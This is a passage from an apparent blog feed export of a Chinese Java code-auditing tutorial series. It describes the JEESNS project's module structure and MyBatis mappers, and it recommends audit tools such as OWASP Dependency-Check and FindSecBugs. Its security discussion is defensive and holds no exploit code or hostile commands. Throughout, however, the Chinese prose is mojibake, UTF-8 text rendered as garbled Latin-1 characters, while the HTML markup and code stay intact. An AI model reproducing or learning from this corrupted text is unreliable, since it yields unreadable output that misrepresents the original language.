class="headerlink" title="æ¨¡å—å°ç»“"></a>æ¨¡å—å°ç»“</h4><p>é€šè¿‡åˆ†æ <code>jeesns-core</code> çš„æ¨¡å—ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº† <code>jeesns</code> çš„æŠ€æœ¯æ ˆï¼Œæ˜¯ç›®å‰æ¯”è¾ƒæµè¡Œçš„ <code>SSM</code> æ¡†æ¶ï¼Œè¿™ä¸ªæ ¸å¿ƒæ¨¡å—ç»™æ•´ä¸ªé¡¹ç›®æ„å»ºäº†ä¸€ä¸ªåŸºæœ¬éª¨æ¶ï¼ŒåŒ…æ‹¬åŠŸèƒ½æ–¹é¢çš„è¿˜æœ‰æˆ‘ä»¬å…³å¿ƒçš„å®‰å…¨æ–¹é¢çš„ï¼ˆè™½ç„¶åªæœ‰ <code>XSS</code> é˜²å¾¡ <code>($ _ $)</code> ï¼‰ã€‚</p><p>åœ¨åˆ†æä¸‹é¢æ¨¡å—ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ <code>SSM</code> çš„ä¸€äº›æ¦‚å¿µã€‚<a href="https://www.cnblogs.com/zyw-205520/p/4771253.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p><p>å½“ç„¶ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯è¦çŸ¥é“ä»€ä¹ˆæ˜¯ <code>MVC</code>ï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„ <code>Web</code> é¡¹ç›®ï¼Œéƒ½æ˜¯åŸºäºè¿™ç§<code>è®¾è®¡æ¨¡å¼</code>å¼€å‘çš„ï¼ŒåŒ…æ‹¬ <code>JEESNS</code> ã€‚<a href="https://blog.csdn.net/qq_26411021/article/details/79493340" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p><blockquote><p>è®¾è®¡æ¨¡å¼ä¸ç¼–ç¨‹è¯­è¨€æ— å…³ï¼Œå¯ä»¥è¯´æ˜¯ä¸€å¥—ç»éªŒç§‘å­¦ï¼Œç”±å‰äººæ€»ç»“ã€åˆ†ç±»ï¼Œè¢«å¹¿æ³›ä½¿ç”¨ã€‚ç›®çš„æ˜¯ä¸ºäº†ä»£ç å¯é‡ç”¨æ€§ã€è®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£ã€ä¿è¯ä»£ç å¯é æ€§ã€‚</p></blockquote><blockquote><blockquote><p><code>Java</code> è®¾è®¡æ¨¡å¼å­¦ä¹ é“¾æ¥ï¼š<a href="https://github.com/AlfredTheBest/Design-Pattern" target="_blank" rel="noopener">https://github.com/AlfredTheBest/Design-Pattern</a></p></blockquote></blockquote><p>å¦‚æœï¼Œä½ å·²ç»äº†è§£äº†<code>SSM</code>ã€<code>MVC</code>çš„æ¦‚å¿µï¼Œé‚£å°±æ¥ç€å¾€ä¸‹çœ‹å§ <code>O(âˆ©_âˆ©)O</code> ã€‚</p><h3 id="jeesns-web"><a href="#jeesns-web" class="headerlink" title="jeesns-web"></a>jeesns-web</h3><p>å¯¹åº” <code>MVC</code> ä¸­çš„ <code>Controller</code> å±‚ï¼Œè´Ÿè´£å…·ä½“ä¸šåŠ¡çš„æ¨¡å—æµç¨‹çš„æ§åˆ¶ï¼Œä¼šè°ƒç”¨åˆ°ä¸‹é¢ <code>Service</code> å±‚çš„æ¥å£æ¥æ§åˆ¶ä¸šåŠ¡æµç¨‹ã€‚</p><p><code>webapp</code> é‡Œæ˜¯ <code>View</code> å±‚ç”¨åˆ°çš„é™æ€èµ„æºï¼ˆjsã€cssã€jpgï¼‰ä»¥åŠ<code>freemarker</code>çš„æ¨¡æ¿æ–‡ä»¶ã€‚</p><p><code>resources</code> é‡Œï¼Œæœ‰é¡¹ç›®ç›¸å…³çš„å„ç§é…ç½®æ–‡ä»¶ã€‚</p><h4 id="æ¨¡å—å°ç»“-1"><a href="#æ¨¡å—å°ç»“-1" class="headerlink" title="æ¨¡å—å°ç»“"></a>æ¨¡å—å°ç»“</h4><p><code>Controller</code> å±‚å’Œ <code>View</code> å±‚ç»“åˆçš„æœ€ç´§å¯†ï¼Œä¸¤è€…é€šå¸¸ååŒå¼€å‘ã€‚</p><p>è¿™é‡Œçš„ <code>Controller</code> å±‚è¿˜è®¾ç½®äº†<code>ç›‘å¬å™¨</code>ï¼Œè´Ÿè´£å¯¹ç”¨æˆ·çš„èº«ä»½å’Œæƒé™è¿›è¡Œè®¤è¯ç®¡ç†ã€‚</p><blockquote><p>é€šå¸¸åœ¨ Java Web é‡Œï¼Œæˆ‘ä»¬ä¼šç”¨ <code>Spring-Security</code> æˆ– <code>Shiro</code> è¿™äº›ç¬¬ä¸‰æ–¹åº“æ¥å¸®åŠ©æˆ‘ä»¬å®ç°<strong>ç”¨æˆ·è®¤è¯å’Œç”¨æˆ·æˆæƒ</strong>çš„åŠŸèƒ½ ã€‚</p></blockquote><h3 id="jeesns-service"><a href="#jeesns-service" class="headerlink" title="jeesns-service"></a>jeesns-service</h3><p><code>Service</code> å±‚ï¼Œä¸»è¦è´Ÿè´£ä¸šåŠ¡æ¨¡å—çš„åº”ç”¨é€»è¾‘åº”ç”¨è®¾è®¡ï¼Œå…ˆè®¾è®¡æ¥å£ï¼Œåœ¨è®¾è®¡å®ç°ç±»ã€‚è¿™ä¸€å±‚ï¼Œæ˜¯çº¯ä¸šåŠ¡é€»è¾‘ã€‚åœ¨ä½¿ç”¨ <code>Service</code> å±‚æ—¶ï¼Œä¼šç»§ç»­è°ƒç”¨ä¸‹é¢çš„ <code>DAO</code> å±‚çš„æ¥å£ã€‚</p><h3 id="jeesns-dao"><a href="#jeesns-dao" class="headerlink" title="jeesns-dao"></a>jeesns-dao</h3><p><code>DAO</code> å±‚ï¼Œè´Ÿè´£æ•°æ®æŒä¹…åŒ–ï¼Œé€šä¿—ç‚¹è¯´å°±æ˜¯ç”¨æ¥å’Œæ•°æ®åº“äº¤äº’ï¼Œè¯»å†™æ•°æ®çš„æ¨¡å—ã€‚</p><p>å‰é¢æœ‰è¯´åˆ°ï¼Œ<code>JEESNS</code> ç”¨äº† <code>MyBatis</code> ä½œä¸ºæ•°æ®æŒä¹…åŒ–æ¡†æ¶ã€‚<code>MyBatis</code> å±äºåŠè‡ªåŠ¨ <code>ORM</code> ï¼Œå®ƒä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨å°†æ•°æ®æŸ¥è¯¢ç»“æœæ˜ å°„åˆ°å¯¹è±¡ï¼Œä½†æ˜¯æ•°æ®æŸ¥è¯¢çš„ <code>SQL</code> è¯­å¥è¿˜æ˜¯è¦æˆ‘ä»¬è‡ªå·±æ‰‹å†™ï¼Œè¿™ç‚¹å’Œå…¶å®ƒçš„ <code>ORM</code> æ˜æ˜¾çš„ä¸ä¸€æ ·ã€‚</p><p><code>MyBatis</code> çš„ä½¿ç”¨æ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä½¿ç”¨<code>æ³¨è§£</code>ï¼Œç›´æ¥å°†<code>SQL</code>è¯­å¥å’Œ<code>æ–¹æ³•</code>ç»‘å®šåœ¨ä¸€èµ·ï¼Œåƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mybatis.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Select</span>(<span class="string">"SELECT * FROM blog WHERE id = #&#123;id&#125;"</span>)</span><br><span class="line">  <span class="function">Blog <span class="title">selectBlog</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼ï¼Œé€‚åˆç®€å•çš„<code>SQL</code>è¯­å¥ï¼Œä¸€æ—¦è¯­å¥é•¿äº†ï¼Œæ³¨é‡Šä¼šå˜å¾—å¤æ‚æ··ä¹±ï¼Œç»´æŠ¤èµ·æ¥å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥å®ƒåªé€‚åˆå°é¡¹ç›®ï¼ˆå°é¡¹ç›®ç”¨çš„ä¹Ÿä¸å¤šï¼‰ã€‚</p><p>ç”¨çš„æœ€å¤šçš„æ˜¯ç¬¬äºŒç§â€”â€”<code>XML</code>é…ç½®ï¼Œå°†<code>SQL</code>è¯­å¥å’Œ<code>Java</code>ä»£ç åˆ†ç¦»ï¼Œæœ‰ç‹¬ç«‹çš„<code>xml</code>æ–‡ä»¶ï¼Œæè¿°æŸä¸ªæ–¹æ³•ä¼šå’ŒæŸä¸ª<code>SQL</code>è¯­å¥ç»‘å®šã€‚</p><p><img src="/2018/10/29/java-audit-step-by-step-2/mybatis1.png" alt="mybatis1"></p><p>å¦‚å›¾ï¼Œæ¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨èµ„æºæ–‡ä»¶ç›®å½•ä¸­ï¼Œéƒ½æœ‰å¯¹åº”çš„<code>xml</code>ã€‚æ¥å£ä¸­çš„æ–¹æ³•ï¼Œå’Œ<code>xml</code>ä¸­<code>id</code>ç›¸åŒçš„<code>SQL</code>è¯­å¥å…³è”ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>IArticleCateDao</code> çš„ <code>list()</code>æ–¹æ³•è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆå°±ä¼šæ‰¾åˆ° <code>ArticleCateMapper.xml</code>ä¸­ <code>id</code>ç­‰äº <code>list</code> çš„æ–¹æ³•ï¼Œæ‰§è¡Œå®ƒçš„ <code>SQL</code>ï¼Œç„¶åæ ¹æ® <code>resultMap</code> æè¿°çš„ <em>å­—æ®µ-å±æ€§</em> æ˜ å°„å…³ç³»ï¼Œè¿”å›ç›¸åº”çš„å®ä¾‹å¯¹è±¡ã€‚</p><p>è¿™é‡Œçš„ <code>resultMap</code> å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"ArticleCateResult"</span> <span class="attr">type</span>=<span class="string">"ArticleCate"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"fid"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"fid"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"status"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"status"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"sort"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"sort"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>id</code>å±æ€§æ˜¯è¯¥æ˜ å°„çš„åç§°ï¼Œ<code>type</code>å±æ€§ä»£è¡¨æ˜ å°„çš„ç±»ã€‚é‡Œé¢æœ‰ <code>5</code> ä¸ªå­å…ƒç´ ï¼Œ<code>id</code>å…ƒç´ æ˜ å°„åˆ°<code>ArticleCate</code>çš„<code>id</code>å±æ€§ã€‚å…¶å®ƒå››ä¸ª<code>result</code>å…ƒç´ ä¸­çš„<code>column</code>å±æ€§ä¼šæ˜ å°„åˆ°å¯¹åº”çš„<code>property</code>å±æ€§ã€‚</p><h4 id="æ¨¡å—å°ç»“-2"><a href="#æ¨¡å—å°ç»“-2" class="headerlink" title="æ¨¡å—å°ç»“"></a>æ¨¡å—å°ç»“</h4><p><code>dao</code> æ¨¡å—è´Ÿè´£æ•°æ®çš„æŒä¹…åŒ–ï¼Œä¼šå’Œæ•°æ®åº“äº¤äº’ã€‚å¼€å‘è€…ç¼–å†™çš„<code>SQL</code>è¯­å¥ä¹Ÿå®šä¹‰åœ¨è¿™ä¸ªæ¨¡å—ï¼Œ<code>MyBatis</code>æœ‰ç‰¹æ®Šçš„è¯­æ³•å°†æŸ¥è¯¢çš„å‚æ•°ä»£å…¥åˆ°<code>SQL</code>è¯­å¥ä¸­ï¼Œå¦‚æœå¼€å‘è€…åœ¨è¿™é‡Œä½¿ç”¨çš„è¯­æ³•æœ‰é—®é¢˜ï¼Œå°±æœ‰ææœ‰å¯èƒ½å‡ºç° <code>SQLæ³¨å…¥</code>ã€‚</p><h3 id="jeesns-model"><a href="#jeesns-model" class="headerlink" title="jeesns-model"></a>jeesns-model</h3><p>å®šä¹‰äº†æ‰€æœ‰å’ŒåŠŸèƒ½ä¸šåŠ¡ç›¸å…³çš„æ•°æ®æ¨¡å‹ï¼Œå’Œæ•°æ®åº“è¡¨å¯¹åº”ã€‚</p><h3 id="jeesns-common"><a href="#jeesns-common" class="headerlink" title="jeesns-common"></a>jeesns-common</h3><p>å®šä¹‰äº†å…¶å®ƒæ¨¡å—ä¼šç”¨åˆ°çš„å¸¸é‡ä»¥åŠå·¥å…·ç±»ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬ç¯‡ä¸»è¦ä»¥ <code>JEESNS</code> ä¸ºä¾‹ï¼Œä»‹ç»äº†ç›®å‰æ¯”è¾ƒæµè¡Œçš„ <code>Java Web</code> é¡¹ç›®çš„ç»“æ„ã€‚</p><p>ç†æ¸…é¡¹ç›®ç»“æ„åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­ä¸‹ä¸€æ­¥â€”â€”æ¼æ´æŒ–æ˜å•¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä»1å¼€å§‹çš„Javaä»£ç å®¡è®¡Â·ç¬¬ä¸€å¼¹Â·åŸºç¡€ç¯‡ï¼ˆä¸Šï¼‰</title>
      <link href="/2018/10/25/java-audit-step-by-step-1/"/>
      <url>/2018/10/25/java-audit-step-by-step-1/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ç¯å¢ƒ"><a href="#åŸºæœ¬ç¯å¢ƒ" class="headerlink" title="åŸºæœ¬ç¯å¢ƒ"></a>åŸºæœ¬ç¯å¢ƒ</h1><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><p>ç›®å‰ï¼Œ<code>JDK</code>å·²ç»å‡ºåˆ°<code>11</code>äº†ï¼Œ<code>JDK</code>æ¯ä¸ªç‰ˆæœ¬éƒ½ä¼šæœ‰äº›æ–°ç‰¹æ€§å‡ºæ¥ã€‚å¾ˆå¤šæƒ…å†µä¸‹<code>JDK</code>å¹¶ä¸å‘ä¸‹å…¼å®¹ï¼Œå¯¼è‡´ä¸€äº›è½¯ä»¶åœ¨è¾ƒæ–°çš„<code>JDK</code>ä¸­æ— æ³•æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥æ¨èç”¨ç°åœ¨æ¯”è¾ƒä¸»æµçš„<code>JDK8</code>ã€‚è€Œä¸”æœ‰äº›æ¼æ´éœ€è¦åœ¨ä½ç‰ˆæœ¬çš„<code>JDK</code>ä¸Šæ‰èƒ½å¤ç°å‡ºæ¥ï¼Œæ¯”å¦‚ååºåˆ—åŒ–ç”¨åˆ°çš„<code>JNDI Bean Property</code>ç±»å‹çš„<code>Gadget</code>ï¼Œéœ€è¦åœ¨å°äº<code>JDK8_113</code>çš„ç‰ˆæœ¬ä¸‹æ‰å¯ä»¥åˆ©ç”¨ï¼Œæ‰€ä»¥åœ¨å®‰è£…çš„æ—¶å€™å»ºè®®å†å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬çš„JDKã€‚JDKå®‰è£…æ—¶è‡ªå¸¦çš„æ§åˆ¶é¢æ¿ç¨‹åºï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„åˆ‡æ¢ç‰ˆæœ¬ã€‚</p><a id="more"></a><p><img src="/2018/10/25/java-audit-step-by-step-1/jdk_ctl.png" alt="jdk-ctl"></p><h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><p>åšä»»ä½•ä¸€é—¨è¯­è¨€çš„ä»£ç å®¡è®¡ï¼Œä¸€ä¸ªå¼ºå¤§çš„IDEæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå¥½çš„IDEå¯ä»¥æå¤§æé«˜æˆ‘ä»¬å®¡è®¡çš„æ•ˆç‡ã€‚å†™Javaçš„ç¨‹åºåŠä»£ç å®¡è®¡ï¼Œæˆ‘æ¨èä½¿ç”¨JetBrainså®¶çš„<a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener"><code>Intelij IDEA</code></a>ï¼ˆJBå¤§æ³•å¥½ O(âˆ©_âˆ©)O ï¼‰ï¼Œå†…ç½®çš„ä»£ç æ£€æŸ¥å·¥å…·æ¯”Eclipseå¼ºå¤ªå¤šäº†ï¼Œè€Œä¸”æœ‰å¾ˆå¤šçš„æ’ä»¶æ”¯æŒã€‚</p><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>å¸¸è§çš„æ•°æ®åº“æœ‰ MySQLã€PostgreSQLã€Oracleï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ç°åœ¨æ¯”è¾ƒæµè¡Œçš„éå…³ç³»å‹æ•°æ®åº“ Redisã€Mongodbã€Memcached ç­‰ç­‰ï¼Œæœ‰äº›æ•°æ®åº“å®‰è£…èµ·æ¥å¯èƒ½æ¯”è¾ƒéº»çƒ¦ï¼Œä¸ç”¨ä¸€æ¬¡æ€§è£…å®Œï¼Œæœ‰éœ€è¦çš„æ—¶å€™å†å»è£…å°±è¡Œäº†ã€‚</p><h2 id="Web-å®¹å™¨"><a href="#Web-å®¹å™¨" class="headerlink" title="Web å®¹å™¨"></a>Web å®¹å™¨</h2><p><code>Java Web</code>åº”ç”¨åœ¨å¼€å‘å®Œåï¼Œé€šå¸¸ä¼šä»¥<code>war</code>åŒ…çš„å½¢å¼å‘å¸ƒï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ª<code>war</code>åŒ…éƒ¨ç½²åˆ°è‡ªå·±çš„<code>Webå®¹å™¨</code>ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯WebæœåŠ¡å™¨ï¼‰é‡Œå»ï¼Œå®¹å™¨åœ¨å¯åŠ¨åä¼šè‡ªåŠ¨è§£å‹<code>war</code>åŒ…ï¼Œå¤„ç†ç”¨æˆ·å‘æ¥çš„HTTPè¯·æ±‚ï¼Œå°†<code>jsp</code>ç¼–è¯‘æˆ<code>servlet</code>ï¼Œç®¡ç†<code>servlet</code>çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚</p><p>å¸¸è§çš„ Web å®¹å™¨æœ‰ Tomcatï¼ŒJBossï¼ŒJettyï¼ŒWeblogicï¼Œä¸åŒçš„å®¹å™¨åœ¨åŠŸèƒ½ã€æ€§èƒ½ä¸Šæœ‰æ‰€å·®å¼‚ï¼Œä½†ä»…ä»…æ˜¯åšä»£ç å®¡è®¡ç”¨<a href="http://tomcat.apache.org/" target="_blank" rel="noopener"><code>Tomcat</code></a>å°±è¶³å¤Ÿäº†ã€‚</p><hr><h1 id="æ’ä»¶"><a href="#æ’ä»¶" class="headerlink" title="æ’ä»¶"></a>æ’ä»¶</h1><h2 id="ä¾èµ–æ£€æŸ¥"><a href="#ä¾èµ–æ£€æŸ¥" class="headerlink" title="ä¾èµ–æ£€æŸ¥"></a>ä¾èµ–æ£€æŸ¥</h2><p>ä¸€ä¸ªå®Œæ•´çš„Javaé¡¹ç›®ï¼Œå¿…ç„¶ä¼šå¼•å…¥ä¸€äº›å¤–éƒ¨çš„ç¬¬ä¸‰æ–¹åº“ã€‚è¿™äº›åº“å¦‚æœå‡ºäº†å®‰å…¨æ¼æ´ï¼Œä¼šç»™åº”ç”¨å¸¦æ¥å·¨å¤§çš„é£é™©ã€‚æ¯”å¦‚ç»å¸¸çˆ†æ´çš„<code>struts2</code>ï¼Œä»¥åŠæœ€è¿‘å‡ å¹´å¾ˆç«çš„Javaååºåˆ—åŒ–æ¼æ´ç›¸å…³çš„<code>fastjson</code>,<code>jackson</code>,<code>apache-commons-collections</code>ç­‰ç­‰ã€‚å¦‚æœå¼€å‘è€…åœ¨å¼€å‘çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹å¼•å…¥çš„åº“åšå®‰å…¨æ£€æŸ¥ï¼Œæˆ–è€…æ˜¯ç›´æ¥ä»ä»£ç åº“é‡Œæ‹‰å‡ºæ¥çš„ä¾èµ–é…ç½®ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½ä¼šå¼•å…¥è¿‡æ—¶äº†å¾ˆä¹…çš„åº“ç‰ˆæœ¬ï¼Œå¸¦æ¥å®‰å…¨éšæ‚£ã€‚åœ¨ OWASP TOP10 ä¸­æœ‰è®²åˆ°è¿™ä¸€ç±»å‹çš„å®‰å…¨é£é™©ã€‚</p><blockquote><p>å‚è€ƒ <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank" rel="noopener"><code>OWASP TOP10 A9</code></a></p></blockquote><p>æ¨èä¸€ä¸ªå·¥å…·ï¼ŒOWASP å‡ºçš„ <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a>ï¼Œå¯ä»¥è‡ªåŠ¨å¸®æˆ‘ä»¬æ£€æŸ¥ï¼Œå¼•å…¥çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦æœ‰å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</p><h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><h4 id="æ’ä»¶æ¨¡å¼"><a href="#æ’ä»¶æ¨¡å¼" class="headerlink" title="æ’ä»¶æ¨¡å¼"></a>æ’ä»¶æ¨¡å¼</h4><p>ä½œä¸º maven çš„æ’ä»¶ä½¿ç”¨ï¼Œç”¨æ³•å¾ˆç®€å•ï¼Œç›´æ¥åœ¨é¡¹ç›®çš„ <code>pom.xml</code> å†™å…¥</p><pre><code><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>ç„¶åï¼Œæ‰§è¡Œ `mvn verify` å°±å¯ä»¥äº†ã€‚</code></pre><h4 id="å‘½ä»¤è¡Œæ¨¡å¼"><a href="#å‘½ä»¤è¡Œæ¨¡å¼" class="headerlink" title="å‘½ä»¤è¡Œæ¨¡å¼"></a>å‘½ä»¤è¡Œæ¨¡å¼</h4><p>æˆ‘æ›´å–œæ¬¢ä»¥ç‹¬ç«‹çš„å‘½ä»¤è¡Œæ¨¡å¼æ¥è¿è¡Œï¼Œè¿™æ ·å°±ä¸ç”¨è¿›IDEé¢å¤–ä¿®æ”¹ <code>pom.xml</code> é…ç½®äº†ã€‚</p><ol><li><p>è¿›å…¥é¡¹ç›®çš„githubï¼Œ<a href="https://github.com/jeremylong/DependencyCheck/releases" target="_blank" rel="noopener"><code>DependencyCheck</code></a>ï¼Œæ‰¾åˆ°æœ€æ–°çš„é‚£ç‰ˆï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p></li><li><p>è§£å‹å‡ºæ¥ï¼Œè¿›åˆ°binç›®å½•ï¼Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«å¯¹åº”windowsç‰ˆå’Œlinuxç‰ˆã€‚</p></li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/bin_directory.png" alt="binç›®å½•"></p><ol start="3"><li>è¿›åˆ°å‘½ä»¤è¡Œä¸‹ï¼Œæ‰§è¡Œ <code>dependency-check.bat --project é¡¹ç›®å --out è¾“å‡ºå -s æºç è·¯å¾„</code> å³å¯ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä»NVDæ›´æ–°æ¼æ´åº“ï¼Œæ‰€ä»¥éœ€è¦ç‚¹æ—¶é—´ï¼ˆåº”è¯¥è¿˜è¦ç¿»å¢™ï¼‰ã€‚</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_dc.png" alt="æ‰§è¡Œè¿‡ç¨‹"></p><ol start="4"><li>æ‰«æå®Œæ¯•åï¼Œä¼šè¾“å‡ºä¸€ä»½æŠ¥å‘Šï¼Œå¦‚ä¸‹ï¼š</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/result_dc.png" alt="æ‰«æç»“æœ"></p><h2 id="FindSecBugs"><a href="#FindSecBugs" class="headerlink" title="FindSecBugs"></a>FindSecBugs</h2><p><a href="https://find-sec-bugs.github.io" target="_blank" rel="noopener">FindSecBugs</a> æ˜¯ä¸“é—¨ç”¨äºæ£€æµ‹Java Webåº”ç”¨å®‰å…¨æ¼æ´çš„æ’ä»¶ï¼Œæ”¯æŒå¤šç§IDEï¼Œè¿˜å¯ä»¥å’ŒSonarQubeç­‰ä»£ç åˆ†æå¹³å°é›†æˆã€‚</p><h3 id="ä½¿ç”¨æ–¹æ³•-1"><a href="#ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><p>å®‰è£…æ–¹æ³•å®˜ç½‘è®²çš„å¾ˆè¯¦ç»†äº†ï¼Œ<a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial" target="_blank" rel="noopener">IDEAä¸­å®‰è£…FindSecBugs</a>ã€‚</p><p>è¿™é‡Œä¸»è¦è®²IDEAä¸­å¦‚ä½•ä½¿ç”¨<code>FindSecBugs</code>ã€‚</p><p>IDEAæ‰“å¼€è¦å®¡è®¡çš„é¡¹ç›®ä»¥åï¼Œå…ˆç‚¹å¼€ FindBugs-IDEA æ ‡ç­¾ï¼Œç„¶åç‚¹å·¦è¾¹çš„è¿™ä¸ªå¸¦ç»¿è‰²æ——å¸œçš„æ–‡ä»¶å¤¹logoï¼Œæ’ä»¶å°±ä¼šè‡ªåŠ¨å¯¹é¡¹ç›®è¿›è¡Œå®¡è®¡ã€‚</p><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_fsb.png" alt="å¼€å§‹æ‰«æ"></p><p><img src="/2018/10/25/java-audit-step-by-step-1/result_fsb.png" alt="æ‰«æç»“æœ"></p><p>çœ‹è¿™ä¸ªé¡¹ç›®çš„æ‰«æç»“æœï¼Œå‘ç°äº† 5 å¤„å®‰å…¨bugï¼Œå…¶ä¸­å››å¤„æ˜¯æ–‡ä»¶çš„æ“ä½œå¯èƒ½è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé€ æˆä»»æ„æ–‡ä»¶åˆ 